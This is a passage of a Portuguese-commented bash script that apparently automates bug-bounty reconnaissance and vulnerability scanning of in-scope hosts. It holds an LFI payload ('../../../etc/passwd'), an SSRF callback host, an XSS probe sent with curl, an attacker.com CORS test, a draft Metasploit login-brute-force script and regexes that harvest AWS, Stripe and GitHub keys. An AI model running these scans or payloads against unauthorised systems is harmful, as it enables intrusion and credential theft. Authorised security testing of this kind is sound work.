# SMB Version Detection (se houver portas SMB)
use auxiliary/scanner/smb/smb_version
set RHOSTS file:../../alive/hosts_only.txt
set THREADS 5
run

# SSH Version Detection (se houver portas SSH)
use auxiliary/scanner/ssh/ssh_version
set RHOSTS file:../../alive/hosts_only.txt
set THREADS 5
run

exit -y
MSFRC
    
    log_info "📝 Resource script criado: reports/metasploit/passive_validation.rc"
    
    # Executar em balanced, aggressive e kamikaze (mais agressivo)
    if [[ "$PROFILE" = "balanced" ]] || [[ "$PROFILE" = "aggressive" ]] || [[ "$PROFILE" = "kamikaze" ]]; then
        log_info "🔥 Executando Metasploit auxiliary scanners..."
        
        local timeout_duration=1800
        [[ "$PROFILE" = "aggressive" ]] && timeout_duration=2700
        [[ "$PROFILE" = "kamikaze" ]] && timeout_duration=3600
        
        timeout "$timeout_duration" msfconsole -q -r reports/metasploit/passive_validation.rc \
            -o reports/metasploit/msf_scan_results.txt \
            2>>logs/metasploit_errors.log || true
        
        if [[ -s reports/metasploit/msf_scan_results.txt ]]; then
            log_success "✅ Metasploit validation completo"
        fi
    else
        log_info "💡 Resource script pronto. Execute manualmente:"
        echo "   msfconsole -r reports/metasploit/passive_validation.rc"
    fi
    
    # Criar guia de validação SQL Injection com Metasploit
    if [[ -s urls/sqli_validated.txt ]]; then
        cat > reports/metasploit/sqli_validation.rc <<'MSFVALIDATE'
# Metasploit SQLi Validation Script
# Valida SQLi encontradas pelo SQLMap

workspace -a sqli_validation

# MySQL SQL Injection Scanner
use auxiliary/scanner/mysql/mysql_login
# Configure RHOSTS com os hosts onde SQLi foi encontrada
set STOP_ON_SUCCESS true
set THREADS 1
# set USER_FILE /usr/share/wordlists/metasploit/common_users.txt
# set PASS_FILE /usr/share/wordlists/metasploit/common_passwords.txt

# ⚠️  CONFIGURE MANUALMENTE antes de executar:
# - Extraia host/IP das URLs em urls/sqli_validated.txt
# - set RHOSTS <host_vulneravel>
# - Execute: run

exit -y
MSFVALIDATE
        
        log_info "📝 SQLi validation script: reports/metasploit/sqli_validation.rc"
    fi
}


# ============= URO - URL Cleanup & Deduplication =============
run_uro() {
    if ! command -v uro >/dev/null 2>&1; then
        log_info "⚠️  uro não instalado"
        log_info "💡 Instale com: pip3 install uro"
        return 0
    fi
    
    if [[ -s urls/all_urls_raw.txt ]]; then
        log_info "▶️  Executando uro para URL deduplication..."
        mkdir -p urls/cleaned
        
        uro -i urls/all_urls_raw.txt -o urls/cleaned/urls_deduplicated.txt 2>/dev/null || true
        
        if [[ -s urls/cleaned/urls_deduplicated.txt ]]; then
            local original=$(wc -l < urls/all_urls_raw.txt)
            local cleaned=$(wc -l < urls/cleaned/urls_deduplicated.txt)
            local saved=$((original - cleaned))
            log_success "✅ URO deduplicação completa: $original → $cleaned URLs (economizou $saved duplicatas)"
        fi
    fi
}

# ============= CRLFUZZ - CRLF Injection Scanner =============
run_crlfuzz() {
    if ! command -v crlfuzz >/dev/null 2>&1; then
        log_info "⚠️  crlfuzz não instalado"
        log_info "💡 Instale com: go install -v github.com/dwisiswant0/crlfuzz/cmd/crlfuzz@latest"
        return 0
    fi
    
    if [[ -s urls/with_params.txt ]]; then
        log_info "▶️  Executando crlfuzz para CRLF injection..."
        mkdir -p reports/crlfuzz
        
        timeout 600s crlfuzz -l urls/with_params.txt \
            -c "$CONCURRENCY" \
            -s \
            -o reports/crlfuzz/crlf_findings.txt 2>/dev/null || true
        
        if [[ -s reports/crlfuzz/crlf_findings.txt ]]; then
            local findings=$(wc -l < reports/crlfuzz/crlf_findings.txt)
            log_success "✅ CRLF fuzzing completo: $findings potenciais vulnerabilidades"
            send_notification "🔥 *CRLF INJECTION FOUND*
$findings endpoints vulneráveis encontrados!
📄 Veja: reports/crlfuzz/crlf_findings.txt" "true"
        fi
    fi
}

# ============= X8 - Advanced Parameter Discovery =============
run_x8() {
    if ! command -v x8 >/dev/null 2>&1; then
        log_info "⚠️  x8 não instalado"
        log_info "💡 Instale com: cargo install x8"
        return 0
    fi
    
    if [[ -s alive/hosts.txt ]]; then
        log_info "▶️  Executando x8 para parameter discovery avançado..."
        mkdir -p reports/x8
        
        head -10 alive/hosts.txt | while read -r url; do
            safe=$(echo "$url" | md5sum | cut -c1-8)
            timeout 300s x8 -u "$url" \
                -w 50 \
                -o reports/x8/params_${safe}.txt 2>/dev/null || true
        done
        
        if ls reports/x8/params_*.txt >/dev/null 2>&1; then
            cat reports/x8/params_*.txt | sort -u > reports/x8/all_hidden_params.txt
            local params=$(wc -l < reports/x8/all_hidden_params.txt)
            log_success "✅ X8 encontrou $params parâmetros ocultos"
        fi
    fi
}

# ============= DNSX - Advanced DNS Enumeration =============
run_dnsx() {
    if ! command -v dnsx >/dev/null 2>&1; then
        log_info "⚠️  dnsx não instalado"
        log_info "💡 Instale com: go install -v github.com/projectdiscovery/dnsx/cmd/dnsx@latest"
        return 0
    fi
    
    if [[ -s subs/all_subs.txt ]]; then
        log_info "▶️  Executando dnsx para DNS enumeration avançado..."
        mkdir -p reports/dnsx logs/dnsx
        
        # DNS probing avançado
        cat subs/all_subs.txt | dnsx \
            -a -aaaa -cname -ns -txt -ptr -mx -soa \
            -resp \
            -silent \
            -t "$CONCURRENCY" \
            -o reports/dnsx/dns_records.txt 2>/dev/null || true
        
        # Wildcard detection
        cat subs/all_subs.txt | dnsx \
            -wd \
            -t "$CONCURRENCY" \
            -o reports/dnsx/wildcards.txt 2>/dev/null || true
        
        if [[ -s reports/dnsx/dns_records.txt ]]; then
            local records=$(wc -l < reports/dnsx/dns_records.txt)
            log_success "✅ DNSX encontrou $records DNS records"
        fi
    fi
}

# ============= NOTIFY - Enhanced Notifications =============
run_notify_tool() {
    if ! command -v notify >/dev/null 2>&1; then
        log_info "⚠️  notify não instalado"
        log_info "💡 Instale com: go install -v github.com/projectdiscovery/notify/cmd/notify@latest"
        return 0
    fi
    
    log_info "▶️  Configurando notify para notificações avançadas..."
    
    # Enviar resumo via notify
    local summary="Bug Bounty Scan Complete
Hosts: $LIVE_HOSTS
URLs: $TOTAL_URLS  
Vulns: $NUCLEI_FAST_TOTAL critical"
    
    echo "$summary" | notify -silent 2>/dev/null || true
}

# ============= JAELES - Alternative Vulnerability Scanner =============
run_jaeles() {
    if ! command -v jaeles >/dev/null 2>&1; then
        log_info "⚠️  jaeles não instalado"
        log_info "💡 Instale com: GO111MODULE=on go install github.com/jaeles-project/jaeles@latest"
        return 0
    fi
    
    if [[ -s alive/hosts.txt ]]; then
        log_info "▶️  Executando Jaeles como alternativa ao Nuclei..."
        mkdir -p reports/jaeles
        
        # Atualizar signatures
        jaeles config init 2>/dev/null || true
        jaeles config reload --signDir ~/.jaeles/base-signatures/ 2>/dev/null || true
        
        # Scan com Jaeles
        timeout 2h jaeles scan \
            -s ~/.jaeles/base-signatures/ \
            -U alive/hosts.txt \
            -c "$CONCURRENCY" \
            -o reports/jaeles/findings.txt 2>/dev/null || true
        
        if [[ -s reports/jaeles/findings.txt ]]; then
            local findings=$(wc -l < reports/jaeles/findings.txt)
            log_success "✅ Jaeles encontrou $findings vulnerabilidades"
        fi
    fi
}

# ============= FEROXBUSTER - Advanced Directory Fuzzing =============
run_feroxbuster() {
    if ! command -v feroxbuster >/dev/null 2>&1; then
        log_info "⚠️  feroxbuster não instalado"
        log_info "💡 Instale com: cargo install feroxbuster"
        return 0
    fi
    
    if [[ -s alive/hosts.txt ]]; then
        log_info "▶️  Executando feroxbuster (modo discovery, sem bruteforce)..."
        mkdir -p reports/feroxbuster
        
        # Usar apenas para descobrir estrutura de diretórios conhecidos
        local wordlist="/usr/share/seclists/Discovery/Web-Content/raft-small-words.txt"
        if [[ ! -f "$wordlist" ]]; then
            wordlist="/usr/share/wordlists/dirb/common.txt"
        fi
        
        if [[ -f "$wordlist" ]]; then
            head -5 alive/hosts.txt | while read -r url; do
                safe=$(echo "$url" | md5sum | cut -c1-8)
                timeout 600s feroxbuster \
                    -u "$url" \
                    -w "$wordlist" \
                    -t "$PARALLEL_HOSTS" \
                    -d 2 \
                    -s 200,301,302,307,401,403 \
                    --silent \
                    -o reports/feroxbuster/dirs_${safe}.txt 2>/dev/null || true
            done
        fi
    fi
}

# ============= SHODAN & CENSYS CLI Integration =============
run_shodan_search() {
    if ! command -v shodan >/dev/null 2>&1; then
        log_info "⚠️  shodan CLI não instalado ou sem API key"
        log_info "💡 Instale: pip3 install shodan && shodan init YOUR_API_KEY"
        return 0
    fi
    
    if [[ -s alive/hosts_only.txt ]]; then
        log_info "▶️  Consultando Shodan para intel adicional..."
        mkdir -p reports/shodan
        
        head -5 alive/hosts_only.txt | while read -r domain; do
            safe=$(echo "$domain" | sed 's/[^a-zA-Z0-9]/_/g')
            timeout 30s shodan search "hostname:$domain" \
                --fields ip_str,port,org,hostnames \
                > reports/shodan/intel_${safe}.txt 2>/dev/null || true
            sleep 2  # API rate limiting
        done
        
        if ls reports/shodan/intel_*.txt >/dev/null 2>&1; then
            cat reports/shodan/intel_*.txt > reports/shodan/shodan_intel.txt
            log_success "✅ Shodan intelligence coletada"
        fi
    fi
}

run_censys_search() {
    if ! command -v censys >/dev/null 2>&1; then
        log_info "⚠️  censys CLI não instalado"
        log_info "💡 Instale: pip3 install censys"
        return 0
    fi
    
    if [[ -s alive/hosts_only.txt ]]; then
        log_info "▶️  Consultando Censys para intel adicional..."
        mkdir -p reports/censys
        
        head -5 alive/hosts_only.txt | while read -r domain; do
            safe=$(echo "$domain" | sed 's/[^a-zA-Z0-9]/_/g')
            timeout 30s censys search "$domain" \
                --max-records 100 \
                > reports/censys/intel_${safe}.txt 2>/dev/null || true
            sleep 2  # API rate limiting
        done
        
        if ls reports/censys/intel_*.txt >/dev/null 2>&1; then
            cat reports/censys/intel_*.txt > reports/censys/censys_intel.txt
            log_success "✅ Censys intelligence coletada"
        fi
    fi
}

# ============= QSREPLACE - Parameter Value Fuzzing =============
run_qsreplace() {
    if ! command -v qsreplace >/dev/null 2>&1; then
        log_info "⚠️  qsreplace não instalado"
        log_info "💡 Instale com: go install -v github.com/tomnomnom/qsreplace@latest"
        return 0
    fi
    
    if [[ -s urls/with_params.txt ]]; then
        log_info "▶️  Usando qsreplace para parameter tampering..."
        mkdir -p urls/fuzzed
        
        # Gerar variações com payloads
        cat urls/with_params.txt | qsreplace "FUZZ" > urls/fuzzed/params_fuzzed.txt 2>/dev/null || true
        cat urls/with_params.txt | qsreplace "../../../etc/passwd" > urls/fuzzed/lfi_test.txt 2>/dev/null || true
        cat urls/with_params.txt | qsreplace "http://burpcollaborator.net" > urls/fuzzed/ssrf_test.txt 2>/dev/null || true
        
        log_success "✅ URLs preparadas para fuzzing"
    fi
}

# ============= UNFURL - URL Parsing & Analysis =============
run_unfurl() {
    if ! command -v unfurl >/dev/null 2>&1; then
        log_info "⚠️  unfurl não instalado"
        log_info "💡 Instale com: go install -v github.com/tomnomnom/unfurl@latest"
        return 0
    fi
    
    if [[ -s urls/all_urls_raw.txt ]]; then
        log_info "▶️  Analisando URLs com unfurl..."
        mkdir -p reports/unfurl
        
        # Extrair domains
        cat urls/all_urls_raw.txt | unfurl domains | sort -u > reports/unfurl/domains.txt 2>/dev/null || true
        
        # Extrair paths
        cat urls/all_urls_raw.txt | unfurl paths | sort -u > reports/unfurl/paths.txt 2>/dev/null || true
        
        # Extrair keys (parameter names)
        cat urls/all_urls_raw.txt | unfurl keys | sort -u > reports/unfurl/param_names.txt 2>/dev/null || true
        
        # Extrair values
        cat urls/all_urls_raw.txt | unfurl values | sort -u > reports/unfurl/param_values.txt 2>/dev/null || true
        
        log_success "✅ Análise de URL patterns completa"
    fi
}

# ============= ANEW - Better Deduplication =============
run_anew() {
    if ! command -v anew >/dev/null 2>&1; then
        log_info "⚠️  anew não instalado"
        log_info "💡 Instale com: go install -v github.com/tomnomnom/anew@latest"
        return 0
    fi
    
    log_info "▶️  Usando anew para deduplicação inteligente..."
    
    # Deduplicate all URLs
    if [[ -s urls/all_urls_raw.txt ]]; then
        cat urls/all_urls_raw.txt | anew urls/all_urls_unique.txt >/dev/null 2>&1 || true
        local original=$(wc -l < urls/all_urls_raw.txt 2>/dev/null || echo 0)
        local unique=$(wc -l < urls/all_urls_unique.txt 2>/dev/null || echo 0)
        log_info "📊 URLs: $original → $unique (removeu $((original - unique)) duplicatas)"
    fi
}

# ============= ORCHESTRAÇÃO DAS NOVAS FERRAMENTAS =============
run_advanced_tools() {
    log_section "EXECUTANDO FERRAMENTAS AVANÇADAS"
    log_info "🚀 Iniciando ferramentas avançadas para superar o xbow..."
    
    # URL Cleanup & Analysis
    (run_uro) &
    (run_anew) &
    (run_unfurl) &
    wait
    
    # Advanced Parameter Discovery
    (run_x8) &
    (run_qsreplace) &
    wait
    
    # Injection Testing
    (run_crlfuzz) &
    wait
    
    # DNS & Network Intel
    (run_dnsx) &
    wait
    
    # OAST Testing
    run_interactsh
    
    # Alternative Scanners
    (run_jaeles) &
    (run_feroxbuster) &
    wait
    
    # External Intelligence
    (run_shodan_search) &
    (run_censys_search) &
    wait
    
    # Notifications
    run_notify_tool
    
    log_success "✅ Todas as ferramentas avançadas foram executadas"
}

# ============= EXECUÇÃO PARALELA CONTROLADA DAS EXTRA TOOLS =============
run_extra_tools() {
    log_info "🚀 Iniciando execução paralela das EXTRA TOOLS..."
    
    # Executar ferramentas em grupos paralelos baseado no perfil
    local max_parallel=3
    [[ "$PROFILE" = "light" ]] && max_parallel=2
    [[ "$PROFILE" = "aggressive" ]] && max_parallel=5
    
    # Grupo 1: XSS Tools (kxss apenas - gxss removido por instabilidade)
    (run_kxss) &
    wait
    
    # Grupo 2: Link/Endpoint Discovery (linkfinder apenas - xnLinkFinder removido)
    (run_linkfinder) &
    (run_paramspider) &
    wait
    
    # Grupo 3: Parameter Bruteforce - DESABILITADO (contra princípios de bug bounty)
    # run_arjun  # Bruteforce de parâmetros removido - use descoberta passiva
    log_info "⚠️  Arjun parameter bruteforce DESABILITADO (contra princípios de bug bounty)"
    
    # Grupo 4: Secret Scanners (paralelo)
    (run_secretfinder) &
    (run_trufflehog) &
    (run_gitleaks) &
    wait
    
    # Grupo 5: Exploitation Tools (sequencial - invasivo)
    run_git_dumper
    run_commix
    run_lfisuite
    
    # Grupo 6: Advanced Testing (paralelo)
    (run_smuggler) &
    (run_ssrfmap) &
    wait
    
    # Grupo 7: Probing & Screenshots (paralelo)
    (run_httprobe) &
    (run_gowitness) &
    (run_aquatone) &
    wait
    
    # Grupo 8: Cloud Enumeration (paralelo)
    (run_s3scanner) &
    (run_cloud_enum) &
    wait
    
    # Grupo 9: Web Server Scanning (Nikto)
    log_info "🔥 Grupo 9: Web Server Scanning..."
    (run_nikto) &
    wait
    
    # Grupo 10: Directory Bruteforce (Dirsearch/Dirb/Gobuster)
    log_info "🔥 Grupo 10: Directory Bruteforce..."
    (run_directory_bruteforce) &
    wait
    
    # Grupo 11: SSL/TLS Analysis (testssl.sh)
    log_info "🔐 Grupo 11: SSL/TLS Security Analysis..."
    (run_testssl) &
    wait
    
    # Grupo 12: XSS Advanced Testing (XSpear)
    log_info "🔥 Grupo 12: XSS Advanced Testing..."
    (run_xspear) &
    wait
    
    # Grupo 13: Nmap NSE Vulnerability Scanning
    log_info "🔥 Grupo 13: Nmap NSE Vulnerability Scanning..."
    (run_nmap_vuln_scan) &
    wait
    
    # Grupo 14: Enhanced Technology Detection (WhatWeb)
    log_info "🔍 Grupo 14: Enhanced Technology Detection..."
    (run_whatweb_enhanced) &
    wait
    
    # Grupo 15: BeEF & Metasploit - Validation Tools
    log_info "🥩 Grupo 15: BeEF & Metasploit Validation..."
    (run_beef_passive) &
    (run_metasploit_validation) &
    wait
    
    # Grupo 16: NOVAS MELHORIAS CRÍTICAS - Parameter Fuzzing & API Testing
    log_info "🔥 Grupo 16: Parameter Fuzzing & API Security..."
    (run_ffuf_param_fuzz) &
    (run_graphql_introspection) &
    (run_cors_testing) &
    wait
    
    log_info "✅ Todas as EXTRA TOOLS foram executadas"
}

# Executar EXTRA TOOLS apenas em modo ativo
if [[ "$DRY_RUN" = "false" ]]; then
    run_extra_tools
    run_advanced_tools
else
    log_info "DRY-RUN: Pulando EXTRA TOOLS e ferramentas avançadas"
fi

# ============= CONTAGEM DE RESULTADOS DAS EXTRA TOOLS (com validação numérica) =============
KXSS_RESULTS=$(ensure_numeric "$(safe_count reports/kxss/kxss_results.txt)" 0)
LINKFINDER_ENDPOINTS=$(ensure_numeric "$(safe_count reports/linkfinder/all_endpoints.txt)" 0)
PARAMSPIDER_PARAMS=$(ensure_numeric "$(safe_count reports/paramspider/all_params.txt)" 0)
SECRETFINDER_SECRETS=$(ensure_numeric "$(safe_count reports/secretfinder/all_secrets.txt)" 0)
GOWITNESS_SCREENSHOTS=$(ensure_numeric "$(find screenshots/gowitness -name "*.png" 2>/dev/null | wc -l)" 0)
AQUATONE_SCREENSHOTS=$(ensure_numeric "$(find screenshots/aquatone -name "*.png" 2>/dev/null | wc -l)" 0)
S3_BUCKETS=$(ensure_numeric "$(safe_count reports/s3scanner/buckets_found.txt)" 0)
BURP_VULNS=$(ensure_numeric "$(safe_count nuclei/burp_scan/findings_summary.txt)" 0)

# Contagem das NOVAS FERRAMENTAS AVANÇADAS (com validação numérica)
X8_PARAMS=$(ensure_numeric "$(safe_count reports/x8/all_hidden_params.txt)" 0)
CRLF_FINDINGS=$(ensure_numeric "$(safe_count reports/crlfuzz/crlf_findings.txt)" 0)
DNSX_RECORDS=$(ensure_numeric "$(safe_count reports/dnsx/dns_records.txt)" 0)
JAELES_FINDINGS=$(ensure_numeric "$(safe_count reports/jaeles/findings.txt)" 0)
UNFURL_DOMAINS=$(ensure_numeric "$(safe_count reports/unfurl/domains.txt)" 0)
SHODAN_INTEL=$(ensure_numeric "$(safe_count reports/shodan/shodan_intel.txt)" 0)
CENSYS_INTEL=$(ensure_numeric "$(safe_count reports/censys/censys_intel.txt)" 0)
URO_CLEANED=$(ensure_numeric "$(safe_count urls/cleaned/urls_deduplicated.txt)" 0)
INTERACTSH_OAST=$(ensure_numeric "$(safe_count nuclei/nuclei_oast.txt)" 0)

# Contagem das FERRAMENTAS DE VALIDAÇÃO (com diretórios garantidos e validação numérica)
mkdir -p reports/nikto reports/dirsearch reports/testssl reports/xspear reports/nmap_vulns tech/whatweb reports/beef reports/metasploit reports/ffuf reports/graphql reports/cors
NIKTO_VULNS=$(ensure_numeric "$(grep -rh "OSVDB\|CVE\|vulnerability" reports/nikto/ 2>/dev/null | wc -l || echo 0)" 0)
DIRSEARCH_PATHS=$(ensure_numeric "$(safe_count reports/dirsearch/interesting_paths.txt)" 0)
TESTSSL_VULNS=$(ensure_numeric "$(safe_count reports/testssl/critical_ssl_issues.txt)" 0)
XSPEAR_XSS=$(ensure_numeric "$(safe_count reports/xspear/xss_vulnerabilities.txt)" 0)
NMAP_VULNS=$(ensure_numeric "$(safe_count reports/nmap_vulns/critical_vulns.txt)" 0)
WHATWEB_TECHS=$(ensure_numeric "$(safe_count tech/whatweb/technologies_summary.txt)" 0)
BEEF_GUIDES=$(ensure_numeric "$(ls reports/beef/*.txt 2>/dev/null | wc -l || echo 0)" 0)
MSF_RESULTS=$(ensure_numeric "$(safe_count reports/metasploit/msf_scan_results.txt)" 0)

# Contagem das NOVAS MELHORIAS (com validação numérica)
FFUF_PARAMS=$(ensure_numeric "$(safe_count reports/ffuf/discovered_params.txt)" 0)
GRAPHQL_VULNS=$(ensure_numeric "$(safe_count reports/graphql/vulnerable_graphql.txt)" 0)
CORS_VULNS=$(ensure_numeric "$(safe_count reports/cors/vulnerable.txt)" 0)

send_notification "✅ *FASE 6 COMPLETA - EXTRA TOOLS*
🎯 kxss: $KXSS_RESULTS resultados
🔗 linkfinder: $LINKFINDER_ENDPOINTS endpoints
📊 paramspider: $PARAMSPIDER_PARAMS parâmetros
🔑 secretfinder: $SECRETFINDER_SECRETS secrets
📸 gowitness: $GOWITNESS_SCREENSHOTS screenshots
📸 aquatone: $AQUATONE_SCREENSHOTS screenshots
☁️ S3 buckets: $S3_BUCKETS encontrados
🔥 Nikto: $NIKTO_VULNS vulnerabilidades
🔍 Dirsearch: $DIRSEARCH_PATHS paths interessantes
🔐 testssl: $TESTSSL_VULNS vulnerabilidades SSL
⚡ XSpear: $XSPEAR_XSS XSS encontrados
🎯 Nmap NSE: $NMAP_VULNS vulnerabilidades
🔧 WhatWeb: $WHATWEB_TECHS tecnologias
🥩 BeEF: $BEEF_GUIDES guias de validação
🎯 Metasploit: Scripts prontos
🔥 FFUF: $FFUF_PARAMS parâmetros descobertos
🌐 GraphQL: $GRAPHQL_VULNS endpoints vulneráveis
🌐 CORS: $CORS_VULNS misconfigurations"

send_notification "🚀 *FERRAMENTAS AVANÇADAS COMPLETAS*
🎯 x8: $X8_PARAMS parâmetros ocultos
🔥 crlfuzz: $CRLF_FINDINGS CRLF findings
🌐 dnsx: $DNSX_RECORDS DNS records
⚡ jaeles: $JAELES_FINDINGS vulnerabilidades
🔍 unfurl: $UNFURL_DOMAINS domínios analisados
📡 shodan: $SHODAN_INTEL registros
📡 censys: $CENSYS_INTEL registros
🧹 uro: $URO_CLEANED URLs limpas
🔔 interactsh: $INTERACTSH_OAST OAST findings"

# Contar vulnerabilidades para resumo (usando ensure_numeric para evitar erros)
NUCLEI_FAST_COUNT=$(ensure_numeric "$(safe_count nuclei/nuclei_hosts_fast.txt)" 0)
NUCLEI_FAST_URLS=$(ensure_numeric "$(safe_count nuclei/nuclei_urls_fast.txt)" 0)
NUCLEI_EXT_COUNT=$(ensure_numeric "$(safe_count nuclei/nuclei_hosts_ext.txt)" 0)
NUCLEI_FAST_TOTAL=$((NUCLEI_FAST_COUNT + NUCLEI_FAST_URLS))
NUCLEI_EXT_TOTAL=$((NUCLEI_EXT_COUNT))
DALFOX_RESULTS=$(ensure_numeric "$(safe_count nuclei/dalfox_results.txt)" 0)
SQLI_VALIDATED=$(ensure_numeric "$(safe_count urls/sqli_validated.txt)" 0)

# Calcular total de secrets com validação numérica
_aws=$(ensure_numeric "$(safe_count secrets/aws_keys.txt)" 0)
_google=$(ensure_numeric "$(safe_count secrets/google_api_keys.txt)" 0)
_jwt=$(ensure_numeric "$(safe_count secrets/jwt_tokens.txt)" 0)
_github=$(ensure_numeric "$(safe_count secrets/github_tokens.txt)" 0)
_stripe=$(ensure_numeric "$(safe_count secrets/stripe_keys.txt)" 0)
_secretfinder=$(ensure_numeric "$SECRETFINDER_SECRETS" 0)
TOTAL_SECRETS=$((_aws + _google + _jwt + _github + _stripe + _secretfinder))

# Certifique-se que o diretório html existe
mkdir -p html

# ============= RELATÓRIOS APRIMORADOS =============
echo ""
echo "========== GENERATING ENHANCED REPORTS =========="
send_notification "📊 *GENERATING REPORTS*
Compilando relatórios finais..."

# ============= CVSS SCORING E VALIDAÇÃO AUTOMÁTICA =============
log_info "📊 Calculando CVSS score e validando vulnerabilidades..."
CVSS_SCORE=$(calc_cvss)

# ============= VALIDAÇÃO AUTOMÁTICA DE VULNERABILIDADES =============
log_info "🔍 Iniciando validação automática de vulnerabilidades..."
mkdir -p reports/validation

# Validar SQLi com testes básicos
if [[ -s urls/sqli_validated.txt ]]; then
    log_info "🔥 Validando SQLi encontrados..."
    while IFS= read -r url || [[ -n "$url" ]]; do
        # Teste básico de erro SQL
        if curl -s "${url}'" -m 10 2>/dev/null | grep -qiE "sql|mysql|syntax|database"; then
            echo "$url - ERRO SQL DETECTADO (alta probabilidade)" >> reports/validation/sqli_confirmed.txt
        fi
    done < <(head -10 urls/sqli_validated.txt)
fi

# Validar XSS com payload simples
if [[ -s urls/gf_xss.txt ]]; then
    log_info "🔥 Validando XSS candidates..."
    xss_payload="<script>alert(1)</script>"
    while IFS= read -r url || [[ -n "$url" ]]; do
        # Teste básico de XSS refletido
        if curl -s "${url}${xss_payload}" -m 10 2>/dev/null | grep -qF "$xss_payload"; then
            echo "$url - XSS REFLETIDO (confirmado)" >> reports/validation/xss_confirmed.txt
        fi
    done < <(head -10 urls/gf_xss.txt)
fi

# Validar secrets com regex aprimorado
if [[ -d js/downloads ]]; then
    log_info "🔍 Validando secrets em JS..."
    grep -rhoE "(sk_live_[0-9a-zA-Z]{24,}|AKIA[0-9A-Z]{16}|ghp_[0-9a-zA-Z]{36})" js/downloads/ 2>/dev/null | \
        sort -u > reports/validation/high_confidence_secrets.txt || true
fi

# Validar CORS
if [[ -s reports/cors/vulnerable.txt ]]; then
    log_info "🌐 Validando CORS misconfigurations..."
    while IFS= read -r line || [[ -n "$line" ]]; do
        url=$(echo "$line" | awk '{print $1}')
        # Dupla verificação
        if curl -H "Origin: https://attacker.com" -I "$url" -s -m 10 2>/dev/null | \
           grep -qi "access-control-allow-origin.*attacker"; then
            echo "$url - CORS CONFIRMADO (crítico)" >> reports/validation/cors_confirmed.txt
        fi
    done < <(head -10 reports/cors/vulnerable.txt)
fi

log_success "✅ Validação automática completa"
log_info "📄 Resultados: reports/validation/"

# Contar vulnerabilidades CONFIRMADAS pela validação
SQLI_CONFIRMED=$(safe_count reports/validation/sqli_confirmed.txt)
XSS_CONFIRMED=$(safe_count reports/validation/xss_confirmed.txt)
SECRETS_HIGH_CONF=$(safe_count reports/validation/high_confidence_secrets.txt)
CORS_CONFIRMED=$(safe_count reports/validation/cors_confirmed.txt)

send_notification "✅ *VALIDAÇÃO AUTOMÁTICA COMPLETA*
🎯 SQLi confirmados: $SQLI_CONFIRMED
⚡ XSS confirmados: $XSS_CONFIRMED
🔑 Secrets high confidence: $SECRETS_HIGH_CONF
🌐 CORS confirmados: $CORS_CONFIRMED
📊 CVSS Score: $CVSS_SCORE/100"

# Contar vulnerabilidades para resumo
NUCLEI_FAST_COUNT=$(safe_count nuclei/nuclei_hosts_fast.txt)
NUCLEI_FAST_URLS=$(safe_count nuclei/nuclei_urls_fast.txt)
NUCLEI_EXT_COUNT=$(safe_count nuclei/nuclei_hosts_ext.txt)
NUCLEI_FAST_TOTAL=$((NUCLEI_FAST_COUNT + NUCLEI_FAST_URLS))
NUCLEI_EXT_TOTAL=$((NUCLEI_EXT_COUNT))
DALFOX_RESULTS=$(safe_count nuclei/dalfox_results.txt)
SQLI_VALIDATED=$(safe_count urls/sqli_validated.txt)

# Criar resumo de vulnerabilidades
cat > reports/vuln_summary.txt <<-VSUMMARY
VULNERABILITY SUMMARY - $(date -u)
=====================================

🔥 CRITICAL FINDINGS:
- Nuclei Critical: $NUCLEI_FAST_TOTAL  
- SQLi Confirmed: $SQLI_VALIDATED
- Exposed Secrets: $TOTAL_SECRETS (includes secretfinder: $SECRETFINDER_SECRETS)
- XSS Findings: $DALFOX_RESULTS

⚡ POTENTIAL ISSUES:
- XSS Candidates: $XSS_CANDIDATES (kxss: $KXSS_RESULTS)
- SQLi Candidates: $SQLI_CANDIDATES
- LFI Candidates: $LFI_CANDIDATES
- SSRF Candidates: $SSRF_CANDIDATES
- Nuclei Medium: $NUCLEI_EXT_TOTAL

📊 ATTACK SURFACE:
- Live Hosts: $LIVE_HOSTS
- URLs with Params: $PARAM_URLS
- API Endpoints: $API_ENDPOINTS
- JS Files Downloaded: $JS_DOWNLOADED
- New Endpoints (linkfinder): $LINKFINDER_ENDPOINTS
- New Params (paramspider): $PARAMSPIDER_PARAMS

🔧 EXTRA TOOLS RESULTS:
- Screenshots (gowitness): $GOWITNESS_SCREENSHOTS
- Screenshots (aquatone): $AQUATONE_SCREENSHOTS
- S3 Buckets Found: $S3_BUCKETS
- Burp Suite Findings: $BURP_VULNS

PROFILE: $PROFILE
MODE: $([ "$DRY_RUN" = "true" ] && echo "DRY-RUN (collection only)" || echo "ACTIVE (full scanning)")
PRIORITY: $([ "$NUCLEI_FAST_TOTAL" -gt 5 ] && echo "🔴 HIGH" || [ "$NUCLEI_FAST_TOTAL" -gt 0 ] && echo "🟡 MEDIUM" || echo "🟢 LOW")
VSUMMARY

# Relatório markdown completo
REPORT=reports/report.md

cat > "$REPORT" <<-EOT
# Bug Bounty Reconnaissance Report
Generated: $(date -u)  
Target Scope: $(basename "$SCOPE_FILE")
Profile: **$PROFILE** | Mode: **$([ "$DRY_RUN" = "true" ] && echo "DRY-RUN" || echo "ACTIVE")**

## 🎯 Executive Summary
- **Attack Surface**: $LIVE_HOSTS live hosts, $PARAM_URLS parameterized URLs
- **Risk Level**: $([ "$NUCLEI_FAST_TOTAL" -gt 5 ] && echo "🔴 **HIGH**" || [ "$NUCLEI_FAST_TOTAL" -gt 0 ] && echo "🟡 **MEDIUM**" || echo "🟢 **LOW**")
- **Scan Profile**: $PROFILE (Concurrency: $CONCURRENCY, Rate: $RATE_LIMIT/s)

## 🔥 Critical Vulnerabilities Confirmed

### High-Risk Nuclei Findings
- **Fast Scan**: $NUCLEI_FAST_TOTAL critical findings
- **Details**: See \`nuclei/nuclei_hosts_fast.txt\` and \`nuclei/nuclei_urls_fast.txt\`

### Cross-Site Scripting (XSS)
- **Dalfox Results**: $DALFOX_RESULTS confirmed findings
- **Candidates**: $XSS_CANDIDATES endpoints
- **Details**: See \`nuclei/dalfox_results.txt\` and \`urls/gf_xss.txt\`

### Information Disclosure  
- **Secrets Found**: $TOTAL_SECRETS items
- **AWS Keys**: $(safe_count secrets/aws_keys.txt)
- **Google API**: $(safe_count secrets/google_api_keys.txt)
- **JWT Tokens**: $(safe_count secrets/jwt_tokens.txt)
- **GitHub Tokens**: $(safe_count secrets/github_tokens.txt)
- **Stripe Keys**: $(safe_count secrets/stripe_keys.txt)
- **Location**: \`secrets/\` directory

## ⚡ Potential Vulnerabilities

### SQL Injection
- **Candidates**: $SQLI_CANDIDATES endpoints  
- **Confirmed**: $(safe_count urls/sqli_validated.txt) vulnerabilities
- **Details**: See \`urls/gf_sqli.txt\` and \`poc/sqli/\`
